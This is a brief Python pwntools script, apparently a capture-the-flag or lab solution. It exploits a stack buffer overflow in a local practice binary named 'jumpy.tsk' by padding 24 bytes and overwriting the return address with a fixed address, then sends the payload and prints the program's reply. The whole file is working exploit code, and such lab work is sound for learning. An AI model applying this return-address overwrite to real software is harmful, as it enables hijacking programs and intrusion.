#!/usr/bin/env python
from pwn import *

# Return address offset
# 12 char array + 4 bytes padding + 4 bytes for ? + 4 bytes for ebp
offset = 12 + 4 + 4 + 4

# New return address
ret = 0x080487f6

# Garbage (12 char array rounded up to 16 + 4 bytes for ebp)
payload  ="A"*offset + p32(ret)

write('pwn.bin', payload+'\n')

# Exploit
p = process('jumpy.tsk')
p.clean_and_log()
p.sendline(payload)
print "msg:", p.recvline()
p.clean_and_log()
p.close()

